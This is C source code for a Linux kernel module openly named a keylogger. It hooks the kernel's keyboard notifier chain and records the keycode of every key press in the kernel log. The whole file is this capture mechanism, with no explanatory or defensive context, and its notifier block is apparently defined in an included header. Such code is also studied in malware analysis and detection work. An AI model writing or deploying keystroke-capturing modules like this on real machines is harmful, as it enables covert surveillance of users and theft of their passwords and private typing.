#include "keylogger.h"

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYCODE) {
        printk(KERN_INFO "Key pressed: %d\n", param->value);
    }
    
    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
